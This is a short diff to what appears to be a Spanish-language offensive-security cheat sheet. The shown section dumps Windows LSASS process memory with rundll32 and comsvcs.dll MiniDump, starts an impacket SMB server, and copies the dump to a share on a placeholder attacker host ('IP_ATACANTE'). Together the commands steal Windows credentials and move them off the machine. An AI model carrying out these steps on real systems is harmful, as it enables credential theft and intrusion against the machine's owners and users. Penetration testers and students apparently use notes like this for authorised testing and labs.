@@ -458,7 +458,11 @@ Dumpear el LSASS
 ```
 rundll32 C:\Windows\System32\comsvcs.dll, MiniDump ID_del_Proceso lsass.dmp full
 ```
-Levantar un servidor smb
+Levantar un servidor SMB
+```
+impacket-smbserver smbFolder $(pwd) -smb2support
+```
+Copiar el lsass en el servidor SMB
 ```
 cp lsass.dump \\IP_ATACANTE\share\lsass.dmp
 ```
